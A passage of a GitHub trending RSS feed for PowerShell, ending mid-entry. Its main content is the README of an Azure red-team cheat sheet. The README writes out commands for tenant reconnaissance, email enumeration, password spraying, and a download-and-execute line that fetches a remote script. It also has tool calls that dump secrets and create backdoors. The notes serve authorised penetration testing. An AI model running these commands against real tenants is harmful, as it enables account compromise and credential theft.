<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-08-27T02:02:25Z</updated>
  <subtitle>Weekly Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>microsoftgraph/microsoft-graph-docs-contrib</title>
    <updated>2023-08-27T02:02:25Z</updated>
    <id>tag:github.com,2023-08-27:/microsoftgraph/microsoft-graph-docs-contrib</id>
    <link href="https://github.com/microsoftgraph/microsoft-graph-docs-contrib" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Documentation for the Microsoft Graph REST API&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft Graph documentation&lt;/h1&gt; &#xA;&lt;p&gt;Thank you for your interest in Microsoft Graph documentation! For the best experience, we recommend you view this content on the &lt;a href=&#34;https://learn.microsoft.com/graph&#34;&gt;Microsoft Graph Developer Portal&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Give us your feedback&lt;/h2&gt; &#xA;&lt;p&gt;Your feedback is important to us.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To let us know about any questions or issues you find in the documentation, &lt;a href=&#34;https://github.com/microsoftgraph/microsoft-graph-docs/issues&#34;&gt;submit an issue&lt;/a&gt; in this repository.&lt;/li&gt; &#xA; &lt;li&gt;We also encourage you to fork, make the fix, and do a pull request of your proposed changes. See &lt;a href=&#34;https://raw.githubusercontent.com/microsoftgraph/microsoft-graph-docs-contrib/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; for contributing guidelines.&lt;/li&gt; &#xA; &lt;li&gt;To let us know about your programming experience, what you would like to see in future versions, code samples, and so on, enter your suggestions and ideas at &lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-365-developer-platform/idb-p/Microsoft365DeveloperPlatform/label-name/Microsoft%20Graph&#34;&gt;Microsoft 365 Developer Platform Tech Community&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Code of conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>rootsecdev/Azure-Red-Team</title>
    <updated>2023-08-27T02:02:25Z</updated>
    <id>tag:github.com,2023-08-27:/rootsecdev/Azure-Red-Team</id>
    <link href="https://github.com/rootsecdev/Azure-Red-Team" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Azure Security Resources and Notes&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Azure Active Directory&lt;/h1&gt; &#xA;&lt;p&gt;Original Source:&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md&#34;&gt;Swisskyrepo&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;PreReq Requirements and free training&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/webcast-opsec-fundamentals-for-remote-red-teams/&#34;&gt;Webcast: OPSEC Fundamentals for Remote Red Teams&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=u_3cV0pzptY&#34;&gt;EDITED EDITION — Getting Started in Pentesting The Cloud–Azure | Beau Bullock | 1-Hour&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/breaching-the-cloud-perimeter-w-beau-bullock/&#34;&gt;Workshop:Breaching The Cloud Perimeter w/ Beau Bullock&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/azure/security/fundamentals/pen-testing&#34;&gt;Microsoft Penetration Testing&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement?rtc=3&#34;&gt;Penetration Testing Rules of Engagement&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Current Bug Bounties&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/msrc/azure-ssrf-research-challenge&#34;&gt;Azure SSRF Research Challenge&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Commando VM&lt;/h2&gt; &#xA;&lt;p&gt;Repo Location: &lt;a href=&#34;https://github.com/fireeye/commando-vm&#34;&gt;Commando VM&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Post Commando Tools to install: &lt;a href=&#34;https://docs.microsoft.com/en-us/microsoft-365/enterprise/connect-to-all-microsoft-365-services-in-a-single-windows-powershell-window?view=o365-worldwide&#34;&gt;Connect to all Microsoft 365 services in a single PowerShell window&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Summary&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-recon-tools&#34;&gt;Azure Recon Tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumeration&#34;&gt;Enumeration&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-valid-emails&#34;&gt;Enumerate valid emails&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-azure-subdomains&#34;&gt;Enumerate Azure Subdomains&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-tenant-with-azure-ad-powershell&#34;&gt;Enumerate tenant with Azure AD Powershell&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-tenant-with-az-powershell&#34;&gt;Enumerate tenant with Az Powershell&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-tenant-with-az-cli&#34;&gt;Enumerate tenant with az cli&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-manually&#34;&gt;Enumerate manually&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumeration-methodology&#34;&gt;Enumeration methodology&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#phishing-with-evilginx2&#34;&gt;Phishing with Evilginx2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#illicit-consent-grant&#34;&gt;Illicit Consent Grant&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#token-from-managed-identity&#34;&gt;Token from Managed Identity&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-api-via-powershell&#34;&gt;Azure API via Powershell&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-api-via-python-version&#34;&gt;Azure API via Python Version&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#get-tokens&#34;&gt;Get Tokens&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#use-tokens&#34;&gt;Use Tokens&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#refresh-token&#34;&gt;Refresh Tokens&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#stealing-tokens&#34;&gt;Stealing Tokens&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#stealing-tokens-from-az-cli&#34;&gt;Stealing tokens from az cli&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#stealing-tokens-from-az-powershell&#34;&gt;Stealing tokens from az powershell&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#add-credentials-to-all-enterprise-applications&#34;&gt;Add Credentials to All Enterprise Applications&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#spawn-ssh-for-azure-web-app&#34;&gt;Spawn SSH for Azure Web App&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-storage-blob&#34;&gt;Azure Storage Blob&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#enumerate-blobs&#34;&gt;Enumerate blobs&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#sas-url&#34;&gt;SAS URL&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#list-and-download-blobs&#34;&gt;List and download blobs&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#runbook-automation&#34;&gt;Runbook Automation&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#create-a-runbook&#34;&gt;Create a Runbook&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#persistence-via-automation-accounts&#34;&gt;Persistence via Automation accounts&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#virtual-machine-runcommand&#34;&gt;Virtual Machine RunCommand&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#keyvault-secrets&#34;&gt;KeyVault Secrets&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#pass--the-certificate&#34;&gt;Pass The Certificate&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#pass-the-prt&#34;&gt;Pass The PRT&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#intunes-administration&#34;&gt;Intunes Administration&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#dynamic-group-membership&#34;&gt;Dynamic Group Membership&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#administrative-unit&#34;&gt;Administrative Unit&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#deployment-template&#34;&gt;Deployment Template&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#application-proxy&#34;&gt;Application Proxy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#conditional-access&#34;&gt;Conditional Access&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-ad&#34;&gt;Azure AD&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-ad-vs-active-directory&#34;&gt;Azure AD vs Active Directory&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#password-spray&#34;&gt;Password Spray&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#convert-guid-to-sid&#34;&gt;Convert GUID to SID&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-ad-connect&#34;&gt;Azure AD Connect &lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-ad-connect---password-extraction&#34;&gt;Azure AD Connect - Password extraction&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-ad-connect---msol-accounts-password-and-dcsync&#34;&gt;Azure AD Connect - MSOL Account&#39;s password and DCSync&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#azure-ad-connect---seamless-single-sign-on-silver-ticket&#34;&gt;Azure AD Connect - Seamless Single Sign On Silver Ticket&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Azure Recon Tools&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;ROADTool&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;pipenv shell&#xA;roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]&#xA;roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]&#xA;roadrecon auth -u test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com -p &amp;lt;PASSWORD&amp;gt;&#xA;roadrecon gather&#xA;roadrecon gui&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;StormSpotter&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# https://github.com/Azure/Stormspotter&#xA;&#xA;# session 1 - backend&#xA;pipenv shell&#xA;python ssbackend.pyz&#xA;&#xA;# session 2 - frontend&#xA;cd C:\Tools\stormspotter\frontend\dist\spa\&#xA;quasar.cmd serve -p 9091 --history&#xA;&#xA;# session 3 - collector&#xA;pipenv shell&#xA;az login -u test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com -p &amp;lt;PASSWORD&amp;gt;&#xA;python C:\Tools\stormspotter\stormcollector\sscollector.pyz cli&#xA;&#xA;# Web access on http://localhost:9091&#xA;Username: neo4j&#xA;Password: BloodHound&#xA;Server: bolt://localhost:7687&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Azure Hound&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# https://github.com/BloodHoundAD/AzureHound&#xA;&#xA;. C:\Tools\AzureHound\AzureHound.ps1&#xA;Invoke-AzureHound -Verbose&#xA;&#xA;# GUI access&#xA;bolt://localhost:7687&#xA;Username: neo4j&#xA;Password: BloodHound&#xA;&#xA;# Cypher query example:&#xA;MATCH p = (n)-[r]-&amp;gt;(g:AZKeyVault) RETURN p&#xA;&#xA;# Change object ID&#39;s to names in Bloodhound&#xA;MATCH (n) WHERE n.azname IS NOT NULL AND n.azname &amp;lt;&amp;gt; &#34;&#34; AND n.name IS NULL SET n.name = n.azname&#xA;&#xA;# Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;List of Microsoft portals: &lt;a href=&#34;https://msportals.io/&#34;&gt;https://msportals.io/&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Azucar&lt;/strong&gt; : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# You should use an account with at least read-permission on the assets you want to access&#xA;git clone https://github.com/nccgroup/azucar.git&#xA;PS&amp;gt; Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File&#xA;&#xA;PS&amp;gt; .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT&#xA;PS&amp;gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000&#xA;PS&amp;gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000&#xA;&#xA;# resolve the TenantID for an specific username&#xA;PS&amp;gt; .\Azucar.ps1 -ResolveTenantUserName user@company.com&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Azurite Explorer&lt;/strong&gt; and &lt;strong&gt;Azurite Visualizer&lt;/strong&gt; : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;git clone https://github.com/mwrlabs/Azurite.git&#xA;git clone https://github.com/FSecureLABS/Azurite&#xA;git submodule init&#xA;git submodule update&#xA;PS&amp;gt; Import-Module AzureRM&#xA;PS&amp;gt; Import-Module AzuriteExplorer.ps1&#xA;PS&amp;gt; Review-AzureRmSubscription&#xA;PS&amp;gt; Review-CustomAzureRmSubscription&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;MicroBurst&lt;/strong&gt; - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$ git clone https://github.com/NetSPI/MicroBurst&#xA;PS C:&amp;gt; Import-Module .\MicroBurst.psm1&#xA;PS C:&amp;gt; Import-Module .\Get-AzureDomainInfo.ps1&#xA;PS C:&amp;gt; Get-AzureDomainInfo -folder MicroBurst -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;SkyArk&lt;/strong&gt; - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.&lt;br&gt; Require:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Read-Only permissions over Azure Directory (Tenant)&lt;/li&gt; &#xA;   &lt;li&gt;Read-Only permissions over Subscription&lt;/li&gt; &#xA;   &lt;li&gt;Require AZ and AzureAD module or administrator right&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$ git clone https://github.com/cyberark/SkyArk&#xA;$ powershell -ExecutionPolicy Bypass -NoProfile&#xA;PS C&amp;gt; Import-Module .\SkyArk.ps1 -force&#xA;PS C&amp;gt; Start-AzureStealth&#xA;&#xA;or in the Cloud Console&#xA;&#xA;PS C&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1&#39;)  &#xA;PS C&amp;gt; Scan-AzureAdmins  &#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;PowerZure&lt;/strong&gt; -&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;require az module !&#xA;$ git clone https://github.com/hausec/PowerZure&#xA;$ ipmo .\PowerZure&#xA;$ Set-Subscription -Id [idgoeshere]&#xA;&#xA;# Reader&#xA;$ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails&#xA;&#xA;# Contributor&#xA;$ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command &#34;whoami&#34;&#xA;$ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File &#34;build.xml&#34;&#xA;$ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents&#xA;$ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine&#39;s disk&#xA;&#xA;# Owner&#xA;$ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest&#xA;&#xA;# Administrator&#xA;$ Create-Backdoor, Execute-Backdoor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Enumeration&lt;/h2&gt; &#xA;&lt;h3&gt;Enumerate valid emails&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Validate email &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS&amp;gt; C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt&#xA;admin@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com   - VALID&#xA;root@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com    - INVALID&#xA;test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com    - VALID&#xA;contact@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com - INVALID&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Extract email lists with a valid credentials : &lt;a href=&#34;https://github.com/nyxgeek/o365recon&#34;&gt;https://github.com/nyxgeek/o365recon&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Password spraying&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS&amp;gt; . C:\Tools\MSOLSpray\MSOLSpray.ps1&#xA;PS&amp;gt; Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password &amp;lt;PASSWORD&amp;gt; -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Enumerate Azure Subdomains&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS&amp;gt; . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1&#xA;PS&amp;gt; Invoke-EnumerateAzureSubDomains -Base &amp;lt;TENANT NAME&amp;gt; -Verbose&#xA;Subdomain Service&#xA;--------- -------&#xA;&amp;lt;TENANT NAME&amp;gt;.mail.protection.outlook.com Email&#xA;&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com Microsoft Hosted Domain&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Enumerate tenant with Azure AD Powershell&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-Module C:\Tools\AzureAD\AzureAD.psd1&#xA;Import-Module C:\Tools\AzureADPreview\AzureADPreview.psd1&#xA;PS&amp;gt; $passwd = ConvertTo-SecureString &#34;&amp;lt;PASSWORD&amp;gt;&#34; -AsPlainText -Force&#xA;PS&amp;gt; $creds = New-Object System.Management.Automation.PSCredential(&#34;test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com&#34;, $passwd)&#xA;PS Az&amp;gt; Connect-AzureAD -Credential $creds&#xA;&#xA;PS AzureAD&amp;gt; Get-AzureADUser -All $true&#xA;PS AzureAD&amp;gt; Get-AzureADUser -All $true | select UserPrincipalName&#xA;PS AzureAD&amp;gt; Get-AzureADGroup -All $true&#xA;PS AzureAD&amp;gt; Get-AzureADDevice&#xA;PS AzureAD&amp;gt; Get-AzureADDirectoryRole -Filter &#34;DisplayName eq &#39;Global Administrator&#39;&#34; | Get-AzureADDirectoryRoleMember&#xA;PS AzureADPreview&amp;gt; Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Enumerate tenant with Az Powershell&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS&amp;gt; $passwd = ConvertTo-SecureString &#34;&amp;lt;PASSWORD&amp;gt;&#34; -AsPlainText -Force&#xA;PS&amp;gt; $creds = New-Object System.Management.Automation.PSCredential (&#34;test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com&#34;, $passwd)&#xA;PS Az&amp;gt; Connect-AzAccount -Credential $creds&#xA;&#xA;PS Az&amp;gt; Get-AzResource&#xA;PS Az&amp;gt; Get-AzRoleAssignment -SignInName test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com&#xA;PS Az&amp;gt; Get-AzVM | fl&#xA;PS Az&amp;gt; Get-AzWebApp | ?{$_.Kind -notmatch &#34;functionapp&#34;}&#xA;PS Az&amp;gt; Get-AzFunctionApp&#xA;PS Az&amp;gt; Get-AzStorageAccount | fl&#xA;PS Az&amp;gt; Get-AzKeyVault&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Enumerate tenant with az cli&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS&amp;gt; az login -u test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com -p &amp;lt;PASSWORD&amp;gt;&#xA;PS&amp;gt; az vm list&#xA;PS&amp;gt; az vm list --query &#34;[].[name]&#34; -o table&#xA;PS&amp;gt; az webapp list&#xA;PS&amp;gt; az functionapp list --query &#34;[].[name]&#34; -o table&#xA;PS&amp;gt; az storage account list&#xA;PS&amp;gt; az keyvault list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Enumerate manually&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Federation with Azure AD or O365 &lt;pre&gt;&lt;code 